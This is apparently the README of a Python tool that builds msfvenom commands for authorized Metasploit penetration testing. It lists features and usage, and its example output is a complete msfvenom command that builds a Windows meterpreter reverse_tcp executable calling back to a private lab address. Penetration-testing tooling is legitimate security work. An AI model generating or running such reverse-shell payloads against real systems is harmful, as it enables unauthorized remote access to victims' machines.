msfvenom-builder

A lightweight Python CLI tool that safely generates validated msfvenom payload commands for authorized Metasploit penetration testing.
This tool does not execute payloads — it only builds commands.

Features

✅ CLI and interactive modes

✅ Input validation (payloads, architecture, IP, port)

✅ No hardcoded credentials

✅ Outputs ready-to-use msfvenom commands

✅ Compatible with modern Metasploit payloads

Requirements

Python 3.9+

Metasploit Framework installed (for using the generated command)

Usage
Interactive mode (recommended)
python msfvenom-builder.py --interactive
"
CLI mode
python msfvenom-builder.py \
  --platform windows \
  --payload windows/x64/meterpreter/reverse_tcp \
  --arch x64 \
  --lhost 192.168.1.10 \
  --lport 4444 \
  --format exe \
  --output payload.exe
  "

Example Output
msfvenom -p windows/x64/meterpreter/reverse_tcp ARCH=x64 LHOST=192.168.1.10 LPORT=4444 -f exe -o payload.exe

Supported Platforms

Windows

Linux

Android

Supported payloads are restricted to a safe allowlist for reliability.

Security Notice

This tool is intended only for authorized security testing.
The author assumes no responsibility for misuse.
